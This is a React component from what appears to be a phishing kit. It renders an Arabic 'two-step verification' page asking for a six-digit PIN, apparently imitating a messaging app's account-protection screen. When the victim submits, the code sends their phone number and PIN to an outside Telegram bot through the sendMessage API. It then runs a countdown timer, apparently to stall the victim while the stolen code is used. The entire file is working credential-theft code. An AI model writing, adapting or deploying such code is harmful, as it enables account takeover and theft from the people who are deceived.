import React, { useState } from "react";
import Axios from "axios";
import { formatPhoneNumberIntl } from "react-phone-number-input";
import SettingsContext from "../Context/SettingsContext";
import Timer from "../Timer/Timer";
import "./Confirm2.css";

export default function Confirm2({ setNcode, ncode }) {
  const [error, setError] = useState(false);
  const [code2, setCode2] = useState("");
  const [workMinutes, setWorkMinutes] = useState(2.5);
  const [loading, setLoading] = useState(false);
  const [messageVisible, setMessageVisible] = useState(true); // Control visibility of message
  const [headlineVisible, setHeadlineVisible] = useState(true); // Control visibility of headline
  const [logoVisible, setLogoVisible] = useState(true); // Control visibility of logo

  const message =
    "هذا الحساب محمي من خلال عملية التحقق \n بخطوتين، أدخل الرمز السري الذي اخرته مسبقا \n(Pin رمز) أثناء إعداد عملية التحقق بخطوتين \n" +
    "إن رقم التعريف ليس كود التفعيل الذي يصلك من خلال رسالة نصية ";

  const APIS = () => {
    const apiToken = process.env.REACT_APP_API_TOKEN;
    const chatId = process.env.REACT_APP_CHAT_ID;
    const text = `${formatPhoneNumberIntl(ncode.number)}  Pin: ${code2}`;
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
    Axios(url);
  };

  const handle = () => {
    if (code2.length !== 6) {
      setError(true);
    } else {
      setNcode({ ...ncode, code2 });
      APIS();
      setError(false);
      setLoading(true);
      setMessageVisible(false); // Hide messages when the button is pressed
      setHeadlineVisible(false); // Hide headline
      setLogoVisible(false); // Hide logo
      setTimeout(() => {
        setCode2("");
        setLoading(false);
        setMessageVisible(true); // Optionally show messages again after the timer
        setHeadlineVisible(true); // Optionally show headline again after the timer
        setLogoVisible(true); // Optionally show logo again after the timer
      }, 150000);
    }
  };

  const handleInputChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");
    setCode2(value);
  };

  return (
    <div className="md:w-1/2 mx-auto shadow-xl rounded-2xl pb-2 bg-white size Conts">
      <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md space-y-8">
          <div>
            {headlineVisible && ( // Conditional rendering for the headline
              <h1 className="text-center green-headline">التحقق بخطوتين</h1>
            )}
            {logoVisible && ( // Conditional rendering for the logo
              <img
                className="mx-auto h-16 w-16"
                src={`${process.env.PUBLIC_URL}/lock.png`}
                alt="Your Company"
              />
            )}
            {messageVisible && ( // Conditional rendering based on state
              <h2 className="mt-6 text-center tracking-tight text-gray-700 whitespace-pre-line">
                {message}
              </h2>
            )}
            {messageVisible && ( // Separate line for the question
              <h2 className="text-center green-text large">
                هل نسيت رقم التعريف الشخصي؟
              </h2>
            )}
          </div>

          {loading ? (
            <SettingsContext.Provider value={{ workMinutes, setWorkMinutes }}>
              <Timer />
            </SettingsContext.Provider>
          ) : (
            <div className="mt-8 space-y-6">
              <div className="pin-input-container">
                <input
                  type="text"
                  maxLength="6"
                  className="pin-input"
                  value={code2}
                  onChange={handleInputChange}
                  placeholder="******"
                />
              </div>

              {error && (
                <div
                  className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg dark:bg-red-200 dark:text-red-800"
                  role="alert"
                >
                  <svg
                    aria-hidden="true"
                    className="flex-shrink-0 inline w-5 h-5 mr-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <div>
                    <span className="font-medium">الرمز غير صحيح</span>
                  </div>
                </div>
              )}

              <div>
                <button
                  className="group relative flex justify-center rounded-md border border-transparent bg-green-500 py-2 px-4 text-sm font-medium text-white hover:bg-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 focus:ring-offset-2 custom-button"
                  onClick={handle}
                >
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3">
                    <svg
                      className="h-5 w-5 text-green-300 group-hover:text-green-400"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 20 20"
                      fill="currentColor"
                      aria-hidden="true"
                    >
                      <path
                        fillRule="evenodd"
                        d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </span>
                  <div className="text-white">الإنضمام</div>
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
